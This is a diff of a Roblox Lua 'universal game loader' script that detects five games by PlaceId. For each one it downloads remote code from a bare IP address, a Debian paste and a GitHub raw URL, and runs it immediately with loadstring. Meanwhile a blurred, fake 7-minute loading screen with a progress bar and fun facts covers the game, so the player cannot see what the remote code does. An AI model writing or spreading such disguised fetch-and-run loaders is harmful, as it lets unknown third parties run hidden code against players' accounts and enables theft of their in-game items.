@@ -1,169 +1,294 @@
---// Modern Game Detector & Loader with Loading Screen (7 minutes UI)
+-- Universal Game Loader (OLD GUI style, fixed handlers, immediate exec + 7min UI)
+-- Supported PlaceIds:
+-- 126884695634066 = Grow-a-Garden
+-- 142823291      = Murder Mystery 2
+-- 920587237      = Adopt Me
+-- 18901165922    = PETS GO
+-- 8737899170     = Pet Simulator 99
 
 -- Services
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local Lighting = game:GetService("Lighting")
 local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
 local StarterGui = game:GetService("StarterGui")
 
--- Fun facts for loading
+local player = Players.LocalPlayer
+
+-- Fun facts (kept lively)
 local funFacts = {
-    "Did you know? Adopt Me! once had over 1.6 million players at once!",
-    "Fun Fact: Murder Mystery 2 was created back in 2014.",
-    "Grow a Garden is one of the newer popular Roblox games!",
-    "Pets Go! is inspired by classic simulator mechanics.",
-    "Pet Simulator 99 is one of the largest pet-based simulators on Roblox.",
-    "Stay hydrated while grinding your favorite game!",
-    "Pro tip: Teaming up with friends makes grinding easier!"
+    "Did you know? Roblox launched in 2006!",
+    "Tip: Press F9 to open the dev console.",
+    "Fun Fact: Lua is the scripting language used by Roblox.",
+    "Pro tip: Take short breaks to avoid burnout.",
+    "Did you know? Some Roblox games reach millions of players!"
 }
 
--- Create loading screen
+-- Old-style Modern Loading Screen (glow + gradient + animations)
 local function createLoadingScreen(gameName, duration)
+    -- Guard
+    if not gameName then gameName = "Game" end
+    duration = duration or 420 -- default 7 minutes
+
+    -- Blur (Lighting)
     local blur = Instance.new("BlurEffect")
+    blur.Name = "UniversalLoaderBlur"
     blur.Size = 0
     blur.Parent = Lighting
-    TweenService:Create(blur, TweenInfo.new(0.5), {Size = 24}):Play()
+    TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Size = 24}):Play()
 
+    -- ScreenGui on CoreGui (so it's always visible)
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "ModernLoader"
-    screenGui.IgnoreGuiInset = true
+    screenGui.Name = "UniversalModernLoader"
     screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
     screenGui.Parent = CoreGui
 
-    -- Smaller centered frame
+    -- Main frame (glass style, smaller & centered)
     local frame = Instance.new("Frame")
+    frame.Name = "Main"
     frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Size = UDim2.fromOffset(380, 170) -- slightly smaller-ish
     frame.Position = UDim2.fromScale(0.5, 0.5)
-    frame.Size = UDim2.fromOffset(300, 150)
-    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    frame.BackgroundTransparency = 0.2
+    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
+    frame.BackgroundTransparency = 0.08
+    frame.BorderSizePixel = 0
     frame.Parent = screenGui
 
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
-    local stroke = Instance.new("UIStroke", frame)
-    stroke.Thickness = 2
-    stroke.Color = Color3.fromRGB(100, 100, 255)
+    local uicorner = Instance.new("UICorner")
+    uicorner.CornerRadius = UDim.new(0, 14)
+    uicorner.Parent = frame
 
+    -- Gradient background
+    local uiGradient = Instance.new("UIGradient")
+    uiGradient.Rotation = 20
+    uiGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(28,28,34)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(40,40,48))
+    })
+    uiGradient.Parent = frame
+
+    -- Glow stroke
+    local uiStroke = Instance.new("UIStroke")
+    uiStroke.Thickness = 2
+    uiStroke.Color = Color3.fromRGB(100, 110, 255)
+    uiStroke.Transparency = 0.6
+    uiStroke.Parent = frame
+
+    -- Title (game name)
     local title = Instance.new("TextLabel")
-    title.Text = "Loading " .. gameName .. "..."
-    title.Font = Enum.Font.GothamBold
-    title.TextSize = 20
-    title.TextColor3 = Color3.new(1, 1, 1)
+    title.Name = "Title"
+    title.Size = UDim2.new(0.9, 0, 0.16, 0)
+    title.Position = UDim2.new(0.05, 0, 0.04, 0)
     title.BackgroundTransparency = 1
-    title.Size = UDim2.fromScale(1, 0.2)
-    title.Position = UDim2.fromScale(0, 0.1)
+    title.Text = gameName
+    title.TextColor3 = Color3.fromRGB(215, 220, 255)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.TextStrokeTransparency = 0.8
     title.Parent = frame
 
-    -- Progress bar background
-    local barBg = Instance.new("Frame")
-    barBg.Size = UDim2.fromScale(0.8, 0.15)
-    barBg.Position = UDim2.fromScale(0.1, 0.45)
-    barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    barBg.Parent = frame
-    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)
+    -- Sub-label
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Name = "Subtitle"
+    subtitle.Size = UDim2.new(0.9, 0, 0.09, 0)
+    subtitle.Position = UDim2.new(0.05, 0, 0.18, 0)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "Preparing your experience..."
+    subtitle.TextColor3 = Color3.fromRGB(170, 175, 220)
+    subtitle.TextScaled = true
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.TextStrokeTransparency = 0.9
+    subtitle.Parent = frame
 
-    -- Progress bar fill
-    local bar = Instance.new("Frame")
-    bar.Size = UDim2.new(0, 0, 1, 0)
-    bar.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
-    bar.Parent = barBg
-    Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
+    -- Loading bar background
+    local loadingBarBg = Instance.new("Frame")
+    loadingBarBg.Name = "LoadingBg"
+    loadingBarBg.Size = UDim2.new(0.82, 0, 0.14, 0)
+    loadingBarBg.Position = UDim2.new(0.09, 0, 0.45, 0)
+    loadingBarBg.BackgroundColor3 = Color3.fromRGB(44, 44, 54)
+    loadingBarBg.BorderSizePixel = 0
+    loadingBarBg.Parent = frame
+    Instance.new("UICorner", loadingBarBg).CornerRadius = UDim.new(0, 8)
 
-    -- Fun fact text
-    local fact = Instance.new("TextLabel")
-    fact.Text = "Tip: " .. funFacts[1]
-    fact.Font = Enum.Font.Gotham
-    fact.TextSize = 14
-    fact.TextColor3 = Color3.new(1, 1, 1)
-    fact.BackgroundTransparency = 1
-    fact.Size = UDim2.fromScale(0.9, 0.2)
-    fact.Position = UDim2.fromScale(0.05, 0.75)
-    fact.TextWrapped = true
-    fact.Parent = frame
+    -- Loading bar fill
+    local loadingBar = Instance.new("Frame")
+    loadingBar.Name = "LoadingFill"
+    loadingBar.Size = UDim2.new(0, 0, 1, 0)
+    loadingBar.BackgroundColor3 = Color3.fromRGB(115, 120, 255)
+    loadingBar.BorderSizePixel = 0
+    loadingBar.Parent = loadingBarBg
+    Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 8)
 
-    -- Animate bar & fun facts for full duration
-    local startTime = tick()
+    -- Gradient on fill
+    local fillGradient = Instance.new("UIGradient")
+    fillGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(115,120,255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(155,170,255))
+    })
+    fillGradient.Parent = loadingBar
+
+    -- Part counter / percent
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Name = "Percent"
+    percentLabel.Size = UDim2.new(0.9, 0, 0.12, 0)
+    percentLabel.Position = UDim2.new(0.05, 0, 0.62, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.TextScaled = true
+    percentLabel.Font = Enum.Font.Gotham
+    percentLabel.TextColor3 = Color3.fromRGB(200,200,255)
+    percentLabel.Parent = frame
+
+    -- Fun fact / rotating
+    local funLabel = Instance.new("TextLabel")
+    funLabel.Name = "FunFact"
+    funLabel.Size = UDim2.new(0.9, 0, 0.18, 0)
+    funLabel.Position = UDim2.new(0.05, 0, 0.74, 0)
+    funLabel.BackgroundTransparency = 1
+    funLabel.TextWrapped = true
+    funLabel.Text = "Fun Fact: " .. funFacts[math.random(1,#funFacts)]
+    funLabel.TextColor3 = Color3.fromRGB(180, 185, 230)
+    funLabel.TextScaled = false
+    funLabel.Font = Enum.Font.Gotham
+    funLabel.TextSize = 14
+    funLabel.Parent = frame
+
+    -- Initialize animations: glow pulse
+    local glowTween = TweenService:Create(uiStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Transparency = 0.2})
+    glowTween:Play()
+
+    -- title pulse
+    TweenService:Create(title, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {TextTransparency = 0.1}):Play()
+
+    -- Control progress filling and fun facts
+    local start = tick()
     local lastFact = 0
-    spawn(function()
-        while tick() - startTime < duration do
-            local progress = (tick() - startTime) / duration
-            TweenService:Create(bar, TweenInfo.new(0.1), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
+    local maxParts = 10000 -- retains previous semantics; percent shown is simple 0..100
+    -- We will update percent & bar over time (but external script is already running)
+    task.spawn(function()
+        while tick() - start < duration and screenGui.Parent do
+            local elapsed = tick() - start
+            local progress = math.clamp(elapsed / duration, 0, 1)
 
-            if tick() - lastFact > 5 then
-                lastFact = tick()
-                fact.Text = "Tip: " .. funFacts[math.random(1, #funFacts)]
+            -- Smoothly tween the bar to current progress
+            pcall(function()
+                loadingBar:TweenSize(UDim2.new(progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.12, true)
+            end)
+
+            -- percent
+            local pct = math.floor(progress * 100)
+            percentLabel.Text = tostring(pct) .. "%"
+
+            -- update fun fact every 5s
+            if elapsed - lastFact >= 5 then
+                lastFact = elapsed
+                local newFact = funFacts[math.random(1, #funFacts)]
+                -- fade out then change
+                TweenService:Create(funLabel, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
+                task.wait(0.45)
+                if funLabel then funLabel.Text = "Fun Fact: " .. newFact end
+                TweenService:Create(funLabel, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
             end
-            task.wait(0.1)
+
+            task.wait(0.12)
         end
 
-        -- Cleanup after duration
-        TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play()
-        task.wait(0.5)
-        blur:Destroy()
-        screenGui:Destroy()
+        -- finish: ensure full
+        pcall(function()
+            loadingBar.Size = UDim2.new(1,0,1,0)
+            percentLabel.Text = "100%"
+        end)
+
+        -- cleanup with nice fade
+        TweenService:Create(blur, TweenInfo.new(0.6), {Size = 0}):Play()
+        TweenService:Create(frame, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+        TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+        TweenService:Create(percentLabel, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+        TweenService:Create(funLabel, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+        TweenService:Create(loadingBar, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+        TweenService:Create(loadingBarBg, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+
+        task.wait(0.8)
+        if screenGui and screenGui.Parent then screenGui:Destroy() end
+        if blur and blur.Parent then blur:Destroy() end
     end)
+
+    -- Return a simple wait function so callers can wait if they want
+    return function()
+        while screenGui and screenGui.Parent do
+            task.wait(0.2)
+        end
+    end
 end
 
--- Run handler
-local function runHandler(gameName, action)
-    -- Run the external script immediately
-    pcall(action)
-
-    -- Show loading screen for 7 minutes
-    createLoadingScreen(gameName, 420)
-
-    StarterGui:SetCore("SendNotification", {
-        Title = "Game detected",
-        Text = gameName,
-        Duration = 5,
-    })
-end
-
--- Handlers for games
+-- Handlers (corrected labels and actions)
 local handlers = {
-    [142823291] = function() -- Murder Mystery 2
-        runHandler("Murder Mystery 2", function()
-            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
-            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
-        end)
-    end,
+    -- Pet Simulator 99 (uses your GitHub raw)
+    [8737899170] = {
+        name = "Pet Simulator 99",
+        action = function()
+            -- user-provided GitHub raw (wrapped with true)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ingeniousmainmn/Universal/refs/heads/main/Universal", true))()
+        end
+    },
 
-    [920587237] = function() -- Adopt Me
-        runHandler("Adopt Me", function()
-            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
-            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
-        end)
-    end,
-
-    [126884695634066] = function() -- Grow a Garden
-        runHandler("Grow a Garden", function()
-            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
-            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
-        end)
-    end,
-
-    [8737899170] = function() -- Pets Go
-        runHandler("Pets Go", function()
+    -- PETS GO
+    [18901165922] = {
+        name = "PETS GO",
+        action = function()
             loadstring(game:HttpGet("https://paste.debian.net/plainh/b11ed528/", true))()
-        end)
-    end,
+        end
+    },
 
-    [8737899171] = function() -- Pet Simulator 99
-        runHandler("Pet Simulator 99", function()
-            loadstring(game:HttpGet("https://paste.debian.net/plainh/f7e3fafa/", true))()
-        end)
-    end,
+    -- Murder Mystery 2
+    [142823291] = {
+        name = "Murder Mystery 2",
+        action = function()
+            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
+            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+        end
+    },
+
+    -- Adopt Me
+    [920587237] = {
+        name = "Adopt Me",
+        action = function()
+            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
+            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+        end
+    },
+
+    -- Grow-a-Garden
+    [126884695634066] = {
+        name = "Grow a Garden",
+        action = function()
+            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
+            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+        end
+    },
 }
 
--- Detect current game
+-- Main dispatcher: create UI (7min) and run handler immediately (same pass)
 local placeId = game.PlaceId
-if handlers[placeId] then
-    handlers[placeId]()
+local entry = handlers[placeId]
+
+if entry then
+    -- Create the old-style loader UI and keep it visible for 420s
+    -- createLoadingScreen returns a wait function (not used here because we want immediate exec)
+    createLoadingScreen(entry.name, 420)
+
+    -- Notify and run the action immediately (no waiting)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {Title = "Game detected"; Text = entry.name; Duration = 5})
+        entry.action()
+    end)
 else
+    -- fallback notification
     StarterGui:SetCore("SendNotification", {
         Title = "Unsupported Game",
-        Text = "No handler found for this game.",
-        Duration = 5,
+        Text = "PlaceId: " .. tostring(placeId),
+        Duration = 5
     })
+    warn("Universal loader: unsupported PlaceId:", placeId)
 end
